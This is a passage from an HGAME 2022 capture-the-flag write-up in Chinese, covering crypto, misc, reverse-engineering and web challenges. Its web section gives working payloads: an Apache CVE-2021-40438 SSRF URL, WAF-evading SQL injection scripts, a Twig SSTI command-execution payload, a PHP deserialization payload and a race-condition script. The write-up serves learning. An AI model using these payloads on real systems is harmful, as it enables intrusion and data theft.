class="number">335</span>: <span class="number">397</span>, <span class="number">336</span>: <span class="number">385</span>, <span class="number">337</span>: <span class="number">339</span>, <span class="number">338</span>: <span class="number">212</span>, <span class="number">339</span>: <span class="number">360</span>, <span class="number">340</span>: <span class="number">203</span>, <span class="number">341</span>: <span class="number">8</span>, <span class="number">342</span>: <span class="number">124</span>, <span class="number">343</span>: <span class="number">158</span>, <span class="number">344</span>: <span class="number">96</span>, <span class="number">345</span>: <span class="number">391</span>, <span class="number">346</span>: <span class="number">251</span>, <span class="number">347</span>: <span class="number">46</span>, <span class="number">348</span>: <span class="number">355</span>, <span class="number">349</span>: <span class="number">168</span>, <span class="number">350</span>: <span class="number">264</span>, <span class="number">351</span>: <span class="number">157</span>, <span class="number">352</span>: <span class="number">395</span>, <span class="number">353</span>: <span class="number">247</span>, <span class="number">354</span>: <span class="number">369</span>, <span class="number">355</span>: <span class="number">250</span>, <span class="number">356</span>: <span class="number">374</span>, <span class="number">357</span>: <span class="number">220</span>, <span class="number">358</span>: <span class="number">87</span>, <span class="number">359</span>: <span class="number">277</span>, <span class="number">360</span>: <span class="number">351</span>, <span class="number">361</span>: <span class="number">289</span>, <span class="number">362</span>: <span class="number">4</span>, <span class="number">363</span>: <span class="number">54</span>, <span class="number">364</span>: <span class="number">19</span>, <span class="number">365</span>: <span class="number">139</span>, <span class="number">366</span>: <span class="number">233</span>, <span class="number">367</span>: <span class="number">111</span>, <span class="number">368</span>: <span class="number">37</span>, <span class="number">369</span>: <span class="number">332</span>, <span class="number">370</span>: <span class="number">178</span>, <span class="number">371</span>: <span class="number">404</span>, <span class="number">372</span>: <span class="number">358</span>, <span class="number">373</span>: <span class="number">341</span>, <span class="number">374</span>: <span class="number">234</span>, <span class="number">375</span>: <span class="number">61</span>, <span class="number">376</span>: <span class="number">298</span>, <span class="number">377</span>: <span class="number">238</span>, <span class="number">378</span>: <span class="number">306</span>, <span class="number">379</span>: <span class="number">3</span>, <span class="number">380</span>: <span class="number">131</span>, <span class="number">381</span>: <span class="number">303</span>, <span class="number">382</span>: <span class="number">366</span>, <span class="number">383</span>: <span class="number">183</span>, <span class="number">384</span>: <span class="number">125</span>, <span class="number">385</span>: <span class="number">377</span>, <span class="number">386</span>: <span class="number">330</span>, <span class="number">387</span>: <span class="number">308</span>, <span class="number">388</span>: <span class="number">162</span>, <span class="number">389</span>: <span class="number">266</span>, <span class="number">390</span>: <span class="number">150</span>, <span class="number">391</span>: <span class="number">409</span>, <span class="number">392</span>: <span class="number">140</span>, <span class="number">393</span>: <span class="number">22</span>, <span class="number">394</span>: <span class="number">11</span>, <span class="number">395</span>: <span class="number">25</span>, <span class="number">396</span>: <span class="number">304</span>, <span class="number">397</span>: <span class="number">51</span>, <span class="number">398</span>: <span class="number">164</span>, <span class="number">399</span>: <span class="number">236</span>, <span class="number">400</span>: <span class="number">32</span>, <span class="number">401</span>: <span class="number">296</span>, <span class="number">402</span>: <span class="number">321</span>, <span class="number">403</span>: <span class="number">246</span>, <span class="number">404</span>: <span class="number">258</span>, <span class="number">405</span>: <span class="number">122</span>, <span class="number">406</span>: <span class="number">285</span>, <span class="number">407</span>: <span class="number">229</span>, <span class="number">408</span>: <span class="number">299</span>, <span class="number">409</span>: <span class="number">15</span>&#125;</span><br><span class="line">target = <span class="string">&quot;klsyf&#123;W0_j0v_ca0z_&#x27;Ks0ao-bln1qstxp_juqfqy&#x27;?&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">410</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(encrypt_name % i, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    f2 = <span class="built_in">open</span>(origin_name % mapping[i], <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    content1 = f1.read()</span><br><span class="line">    content2 = f2.read()</span><br><span class="line">    f1.close()</span><br><span class="line">    f2.close()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content1)):</span><br><span class="line">        <span class="keyword">if</span> content1[j].isalpha():</span><br><span class="line">            key.append((<span class="built_in">ord</span>(content2[j]) - <span class="built_in">ord</span>(content1[j]) + <span class="number">26</span>) % <span class="number">26</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key.append(<span class="number">0</span>)</span><br><span class="line">    ans = encrypt(target, key)</span><br><span class="line">    <span class="keyword">if</span> ans.startswith(<span class="string">&quot;hgame&#123;D0_y0u_kn0w_&#x27;Kn0wn-&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>
<h4 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h4><p>第一个是盲文，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.replace(<span class="string">&#x27;⠨&#x27;</span>,<span class="string">&#x27;.&#x27;</span>).replace(<span class="string">&#x27;⠤&#x27;</span>,<span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;⠌&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;..-/--.../--..--/-----/--.../--..--/---../...--/--..--/.-../....-/--..--/..---/....-/--..--/..---/--.../--..--/.-.-/-..../--..--/...-/....-/--..--/....-/--.../--..--/---../...../--..--/---../--.../--..--/...-/-..../--..--/---../...--/--..--/.----/--.../--..--/--.../...--/--..--/...-/....-/--..--/-./....-/--..--/----./--.../--..--/--.../...../--..--/..-/-..../--..--/.-../....-/--..--/.----/--.../--..--/./-..../--..--/----./...../--..--/---../...--/--..--/.----/--.../--..--/..-/....-/--..--/...-/....-/--..--/.----/...--/--..--/.-.-/....-/--..--/--.../...../--..--/-..../....-/--..--/--.../....-/--..--/-----/--.../--..--/./-..../--..--/.----/....-/--..--/-..../--.../--..--/-----/...--/--..--/---../--.../--..--/..---/...../--..--/....-/--.../--..--/.-.-/-..../--..--/-..../...--/--..--/.----/...../--..--/.----/....-/--..--/--.../...--/--..--/--.../--.../--..--/-..../-..../--..--/....-/--.../--..--/--.../...--/--..--/.-.-/-..../--..--/..-/....-/--..--/./....-/--..--/....-/-..../--..--/...../-..../--..--/....-/....-/--..--/...../...--/--..--/---../-..../--..--/....-/....-/--..--/....-/-....&#x27;</span></span><br></pre></td></tr></table></figure>
<p>翻转摩尔斯码后得到若干十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D</span><br></pre></td></tr></table></figure>
<p>转字符串后得到：<code>FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=</code></p>
<p>维吉尼亚，密钥是<code>hgame</code>:<code>YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=</code></p>
<p>解base64得到：<code>c0bmvghyz_&#123;0Raz_gxxm0thkzo_0ob0m_vokcczt_!r&#125;</code></p>
<p>逆凯撒21位得到：<code>h0gralmde_&#123;0Wfe_lccr0ympet_0tg0r_atphhey_!w&#125;</code></p>
<p>2层栅栏密码得到：<code>hgame&#123;Welc0me_t0_the_w0rld_0f_crypt0graphy!&#125;</code></p>
<h4 id="Dancing-Line"><a href="#Dancing-Line" class="headerlink" title="Dancing Line"></a>Dancing Line</h4><p>往右走是0，往下走是1，硬数<code>hgame&#123;Danc1ng_L1ne_15_fun,_15n&#39;t_1t?&#125;</code></p>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p>misc零基础，瞎打</p>
<h4 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h4><p>前两关用archpr爆破</p>
<p>第三关已知明文攻击</p>
<p>第四关binwalk</p>
<p>第五关伪加密</p>
<p><img src="/2022/01/21/hgame2022/assets/image-20220124113217498.png" alt="image-20220124113217498"></p>
<h4 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h4><p>从流量包里导出图片，然后用stegsolve打开，前一半flag改颜色通道改出条形码，扫出来是flag前一半，后一半是lsb隐写</p>
<p><img src="/2022/01/21/hgame2022/assets/image-20220121162759348.png" alt="image-20220121162759348"></p>
<h4 id="群青-其实是幽灵东京）"><a href="#群青-其实是幽灵东京）" class="headerlink" title="群青(其实是幽灵东京）"></a>群青(其实是幽灵东京）</h4><p>拖入audacity查看频域图得到密码Yoasobi</p>
<p><img src="/2022/01/21/hgame2022/assets/image-20220126115834952.png" alt="image-20220126115834952"></p>
<p>尝试用steghide解密<code>steghide extract -sf 群青，但是是幽灵东京.wav -p &#39;Yoasobi&#39;</code>失败</p>
<p>拖入SilentEye，用AES256解密方式，lsb隐写解密得到一串网址，下载得到sstv文件。</p>
<p>在kali上装一个qsstv,播放一遍得到图片，扫码得到flag（这个声音听得我耳朵要炸了）</p>
<p><img src="/2022/01/21/hgame2022/assets/image-20220126121520484.png" alt="image-20220126121520484"></p>
<p>震撼我**一整年</p>
<h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>之前基本没开过ida属于是</p>
<h4 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h4><p>速成x86汇编学习网址：<a href="https://www.cnblogs.com/YukiJohnson/archive/2012/10/27/2741836.html">https://www.cnblogs.com/YukiJohnson/archive/2012/10/27/2741836.html</a></p>
<p>终于补了汇编一直不会的天坑，在此感谢老战友<code>ssdfzhyf</code>的耐心解惑。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;</span><br><span class="line">  <span class="number">145</span>,  <span class="number">97</span>,   <span class="number">1</span>, <span class="number">193</span>,  <span class="number">65</span>, <span class="number">160</span>,  <span class="number">96</span>,  <span class="number">65</span>, <span class="number">209</span>,  <span class="number">33</span>, </span><br><span class="line">   <span class="number">20</span>, <span class="number">193</span>,  <span class="number">65</span>, <span class="number">226</span>,  <span class="number">80</span>, <span class="number">225</span>, <span class="number">226</span>,  <span class="number">84</span>,  <span class="number">32</span>, <span class="number">193</span>, </span><br><span class="line">  <span class="number">226</span>,  <span class="number">96</span>,  <span class="number">20</span>,  <span class="number">48</span>, <span class="number">209</span>,  <span class="number">81</span>, <span class="number">192</span>,  <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> c = (<span class="keyword">int</span>)ida_chars[i];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((((j &lt;&lt; <span class="number">4</span>) % <span class="number">0x100</span> + (j &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0x17</span>) == c) &#123;</span><br><span class="line">				<span class="built_in">putchar</span>(j);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="creakme"><a href="#creakme" class="headerlink" title="creakme"></a>creakme</h4><p>用ida32打开反编译得到伪代码，发现是一个魔改的TEA，上网搜了个脚本改改</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0x468acf00</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">305419896</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= sum ^ ((v0&lt;&lt;<span class="number">4</span>) + k0) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v0 -= sum ^ ((v1&lt;&lt;<span class="number">4</span>) + k2) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,sum);</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">8</span>]=&#123;<span class="number">0x52EB78C2</span>,<span class="number">0xED9CE5ED</span>,<span class="number">0x48D93488</span>,<span class="number">0x030C144C</span>,<span class="number">0xCF9284AA</span>,<span class="number">0x65E0F2E3</span>,<span class="number">0xAE1FEDE6</span>,<span class="number">0xBA5A126D</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">0x44434241</span>,<span class="number">0x48474645</span>,<span class="number">0x4C4B4A49</span>,<span class="number">0x504F4E4D</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">    	<span class="built_in">decrypt</span>(v+i,k); 	</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>,v[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>第一次做逆向，大小端傻傻分不清楚</p>
<h4 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h4><p>装好jeb工具，打开按tab查看逻辑发现是一个rc4+base64，秒了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">    ans = b64decode(<span class="string">&quot;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    key = <span class="string">&#x27;carol&#x27;</span></span><br><span class="line">    res = RC4crypt(key, ans)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h4 id="猫头鹰是不是猫"><a href="#猫头鹰是不是猫" class="headerlink" title="猫头鹰是不是猫"></a>猫头鹰是不是猫</h4><p>总结一下快捷键：</p>
<ul>
<li><code>d</code>改byte，dword，qword</li>
<li><code>shift+e</code>导出数据</li>
<li><code>y</code>重新定义数据类型</li>
<li><code>*</code>数组</li>
</ul>
<p>看懂逻辑后，做个矩阵乘法求逆即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n=<span class="number">64</span>;</span><br><span class="line"><span class="keyword">double</span> a[<span class="number">66</span>][<span class="number">66</span>],b[<span class="number">66</span>][<span class="number">66</span>],c[<span class="number">66</span>][<span class="number">130</span>],f[<span class="number">64</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gauss</span><span class="params">(<span class="keyword">double</span> (*A)[<span class="number">130</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)<span class="keyword">if</span>(A[j][i]&gt;A[k][i])k=j; </span><br><span class="line">        <span class="keyword">double</span> del=A[k][i];</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">fabs</span>(del=A[k][i])&lt;eps)<span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;<span class="number">2</span>*n;j++)<span class="built_in">swap</span>(A[i][j],A[k][j]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;<span class="number">2</span>*n;j++)A[i][j]/=del;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)  </span><br><span class="line">            <span class="keyword">if</span>(j!=i)</span><br><span class="line">            &#123;</span><br><span class="line">                del=A[j][i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=i;k&lt;<span class="number">2</span>*n;k++)A[j][k]-=A[i][k]*del;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">			a[i][j]=dword_4140[i*n+j]/<span class="number">10</span>;</span><br><span class="line">			b[i][j]=dword_8140[i*n+j]/<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)c[i][j]+=a[i][k]*b[k][j];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)c[i][i+n]=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">gauss</span>(c);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    	<span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">    		f[i]+=ini[j]*c[j][i+n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,<span class="built_in"><span class="keyword">char</span></span>(<span class="built_in"><span class="keyword">int</span></span>(<span class="built_in">floor</span>(f[i]+<span class="number">0.5</span>))));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="iot"><a href="#iot" class="headerlink" title="iot"></a>iot</h3><p>用hex2bin转换，然后strings拿到flag。</p>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h4><p>CVE-2021-40438</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://httpd.summ3r.top:60010/proxy/?unix:[A*5000]|http://internal.host/flag</span><br></pre></td></tr></table></figure>
<h4 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h4><p>webpack,看f12前端的源码即可。</p>
<h4 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h4><p>sql注入，注入点在报错界面，通过报错能查看出查询语句，同时也能测出waf掉了哪些关键字，可以通过双写绕过，为了方便，就写脚本帮我replace了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://121.43.141.153:60056/error.php?code=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = s.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27; like &#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*/**/*/&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;frofromm&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;whwhereere&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;404 union select 1, database()#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;404 union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;404 union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;fllllllllaaaaaag&#x27;#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;404 union select 1, flag from fllllllllaaaaaag#&quot;</span></span><br><span class="line">payload = bypass(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<h4 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h4><p>下载下来源码，登录用弱类型绕，后面这个老哥自己手动实现了一个对映射的序列化再反序列化，自己写的肯定有bug，bug就在于</p>
<p>最终的payload：<code>&#123;&quot;sb|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;aaa&quot;:&quot;2b&quot;&#125;</code></p>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h4><p>查看hint，该项目装了如下三个包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symfony/polyfill-ctype v1.24.0</span><br><span class="line">symfony/polyfill-mbstring v1.24.0</span><br><span class="line">twig/twig v3.3.7</span><br></pre></td></tr></table></figure>
<p>依次搜索，twig在18年爆出了一个SSTI的洞，于是在url处找到注入点：<code>[146.56.223.34:60036/redirect.php?url=&#123;&#123;1*7&#125;&#125;](http://146.56.223.34:60036/redirect.php?url=&#123;&#123;1*7&#125;&#125;)</code></p>
<p>随手找了个TWIG3.X的payload，<code>&#123;&#123;["id", 0\]|sort("system")|join(",")&#125;&#125;</code></p>
<p>成功rce，但是读flag的时候cat被waf，用head去绕，正则匹配了hgame内容，base64一下即可。</p>
<p>最终payload：</p>
<p><code>http://146.56.223.34:60036/redirect.php?url=&#123;&#123;["head /flag|base64", 0]|sort("system")|join(",")&#125;&#125;)</code></p>
<h4 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h4><p>条件竞争，抢占的资源是钱，可以先狂发300个40块的订单的包，然后开多线程分别去支付这些包，如果条件竞争顺利的话应该来不及太扣钱，然后我们就分别对这些订单退款钱就够了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://559e013ac8.vidar-shop.mjclouds.com/api/pay/create&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;uid&quot;</span>: <span class="number">315</span>,  <span class="string">&quot;amount&quot;</span>: <span class="number">20</span>&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQxMzgxNjUsImlhdCI6MTY0NDA1MTc2NSwidWlkIjozMTV9.QyUNGJRUDQ4qp13utRgTWV8jDs4UhQYWOX8BP6wWcng&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    payload[<span class="string">&quot;oid&quot;</span>] = <span class="built_in">id</span></span><br><span class="line">    requests.post(url, headers=header, data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line">ts = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5603</span>, <span class="number">5855</span>):</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;t&#123;0&#125; = threading.Thread(target=buy,args=(i,))&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;ts.append(t&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> ts:</span><br><span class="line">    s.start()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DONE&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h4><p>hint里给了部分查询语句，通过<code>&#39;) or (&#39;</code>左右闭合后中间能进行布尔盲注，尝试用left,ascii等函数均未返回预期结果，故不是mysql数据库，经验证为sqlite注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://f4440d8510.login.summ3r.top:60067/login&#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># sql = &#x27;select group_concat(sql) from sqlite_master&#x27;</span></span><br><span class="line">sql = <span class="string">&#x27;select group_concat(password) from uuussseeerrrsss limit 0, 1&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    L = <span class="number">32</span></span><br><span class="line">    R = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> R - L &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (L + R) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;ass&#x27;) or substr((%s), %d, 1) &lt; &#x27;%c&#x27; or (username=&#x27;test1&quot;</span> % (sql, i, <span class="built_in">chr</span>(mid)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">        &#125;</span><br><span 